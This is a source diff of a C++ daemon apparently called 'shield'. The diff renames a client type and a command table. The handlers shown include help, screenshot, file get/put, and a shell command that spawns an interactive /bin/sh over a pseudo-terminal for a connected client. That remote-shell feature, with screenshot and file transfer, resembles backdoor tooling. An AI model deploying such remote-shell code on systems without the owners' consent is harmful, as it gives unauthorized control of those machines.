@@ -8,15 +8,15 @@
 
 #include "cmds/screenshot.inc.cc"
 
-int shield_cmd_help(Client *client, [[maybe_unused]] DaemonServer *server, const char *args)
+int shield_cmd_help(client_t *client, [[maybe_unused]] DaemonServer *server, const char *args)
 {
 	if (!args || !*args)
 	{
-		for (int i = 0; COMMANDS[i].command != NULL; ++i)
+		for (int i = 0; commands[i].command != NULL; ++i)
 		{
-			client->output_buffer.append(COMMANDS[i].usage);
+			client->output_buffer.append(commands[i].usage);
 			client->output_buffer.append(": ");
-			client->output_buffer.append(COMMANDS[i].description);
+			client->output_buffer.append(commands[i].description);
 			client->output_buffer.push_back('\n');
 		}
 		return (0);
@@ -25,16 +25,16 @@ int shield_cmd_help(Client *client, [[maybe_unused]] DaemonServer *server, const
 	std::string option;
 	std::istringstream argstream(args);
 	argstream >> option;
-	for (int i = 0; COMMANDS[i].command != NULL; ++i)
+	for (int i = 0; commands[i].command != NULL; ++i)
 	{
-		if (option == COMMANDS[i].command)
+		if (option == commands[i].command)
 		{
 			client->output_buffer.append("Usage: ");
-			client->output_buffer.append(COMMANDS[i].usage);
+			client->output_buffer.append(commands[i].usage);
 			client->output_buffer.push_back('\n');
 
 			client->output_buffer.append("Description: ");
-			client->output_buffer.append(COMMANDS[i].description);
+			client->output_buffer.append(commands[i].description);
 			client->output_buffer.push_back('\n');
 
 			return 0;
@@ -49,7 +49,7 @@ int shield_cmd_help(Client *client, [[maybe_unused]] DaemonServer *server, const
 }
 
 // Summon a shell for the client
-int	shield_cmd_shell(Client *client, DaemonServer *server, const char *args)
+int	shield_cmd_shell(client_t *client, DaemonServer *server, const char *args)
 {
 	(void) args; // unused parameter
 	int master_fd, pid;
@@ -62,7 +62,7 @@ int	shield_cmd_shell(Client *client, DaemonServer *server, const char *args)
 		return (1);
 	if ( pid == 0)
 	{
-		char *argv[] = {"sh", "-i", NULL};
+		char *argv[] = {(char *)"sh", (char *)"-i", NULL};
 		char *envp[] = {NULL};
 		execve("/bin/sh", argv, envp);
 
@@ -96,7 +96,7 @@ int	shield_cmd_shell(Client *client, DaemonServer *server, const char *args)
 }
 
 int	shield_cmd_screenshot(
-	[[maybe_unused]] Client *client,
+	[[maybe_unused]] client_t *client,
 	[[maybe_unused]] DaemonServer *server,
 	[[maybe_unused]] const char *args
 ) {
@@ -116,7 +116,7 @@ int	shield_cmd_screenshot(
 	return (0);
 }
 
-int	shield_cmd_get(Client *client, DaemonServer *server, const char *args)
+int	shield_cmd_get(client_t *client, DaemonServer *server, const char *args)
 {
 	(void) client; // unused parameter
 	(void) server; // unused parameter
@@ -124,7 +124,7 @@ int	shield_cmd_get(Client *client, DaemonServer *server, const char *args)
 	return (0);
 }
 
-int	shield_cmd_put(Client *client, DaemonServer *server, const char *args)
+int	shield_cmd_put(client_t *client, DaemonServer *server, const char *args)
 {
 	(void) client; // unused parameter
 	(void) server; // unused parameter
